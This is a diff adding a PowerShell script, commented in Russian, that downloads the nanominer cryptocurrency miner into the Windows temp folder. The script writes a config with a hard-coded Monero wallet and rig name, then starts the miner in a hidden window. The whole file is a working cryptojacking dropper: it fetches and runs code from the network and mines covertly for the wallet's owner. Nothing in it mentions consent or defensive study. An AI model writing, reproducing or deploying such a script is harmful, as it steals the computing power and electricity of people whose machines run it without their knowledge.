@@ -1,0 +1,77 @@
+# === Настройки ===
+$downloadUrl = "https://github.com/nanopool/nanominer/releases/latest/download/nanominer-windows.zip"
+$downloadPath = "$env:TEMP\nanominer-windows.zip"
+$extractPath = "$env:TEMP\nanominer"
+$configFilePath = "$extractPath\config.ini"
+$minerExecutable = "$extractPath\nanominer.exe"
+
+# Конфигурация майнинга
+$coin = "xmr"
+$wallet = "45wjbEoJWy9ZBJtXRQJSvdfx2U3q8FvCwjPNZrPSJCjwZCu3GrNtskPPbcbE18sWHENTxG23xPwPwg1DabVnPFRE2eiqLDq"
+$rigname = "XMR"
+$email = "LOVE@proton.me"
+
+# === Функция для записи в лог ===
+function Write-Log {
+    param ([string]$Message)
+    $logFile = "$env:TEMP\nanominer_setup.log"
+    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    Add-Content -Path $logFile -Value "[$timestamp] $Message"
+}
+
+# === Скачивание NanoMiner ===
+Write-Log "Начало установки NanoMiner."
+try {
+    Write-Log "Скачивание NanoMiner..."
+    Invoke-WebRequest -Uri $downloadUrl -OutFile $downloadPath -ErrorAction Stop
+    Write-Log "NanoMiner скачан в $downloadPath."
+} catch {
+    Write-Log "Ошибка при скачивании NanoMiner: $_"
+    exit 1
+}
+
+# === Распаковка архива ===
+try {
+    Write-Log "Распаковка NanoMiner..."
+    if (Test-Path $extractPath) {
+        Remove-Item -Recurse -Force -Path $extractPath
+    }
+    Expand-Archive -Path $downloadPath -DestinationPath $extractPath -Force
+    Write-Log "NanoMiner распакован в $extractPath."
+} catch {
+    Write-Log "Ошибка при распаковке NanoMiner: $_"
+    exit 1
+}
+
+# === Создание конфигурационного файла ===
+try {
+    Write-Log "Создание конфигурационного файла..."
+    $configContent = @"
+[RandomX]
+coin = $coin
+wallet = $wallet
+rigname = $rigname
+email = $email
+"@
+    Set-Content -Path $configFilePath -Value $configContent -Encoding UTF8
+    Write-Log "Конфигурационный файл создан: $configFilePath"
+} catch {
+    Write-Log "Ошибка при создании конфигурационного файла: $_"
+    exit 1
+}
+
+# === Запуск NanoMiner в скрытом режиме ===
+try {
+    Write-Log "Запуск NanoMiner в скрытом режиме..."
+    $startInfo = New-Object System.Diagnostics.ProcessStartInfo
+    $startInfo.FileName = $minerExecutable
+    $startInfo.WindowStyle = 'Hidden' # Скрытый режим
+    $startInfo.UseShellExecute = $true
+    [System.Diagnostics.Process]::Start($startInfo)
+    Write-Log "NanoMiner успешно запущен в фоне."
+} catch {
+    Write-Log "Ошибка при запуске NanoMiner: $_"
+    exit 1
+}
+
+Write-Log "Установка и запуск NanoMiner завершены."
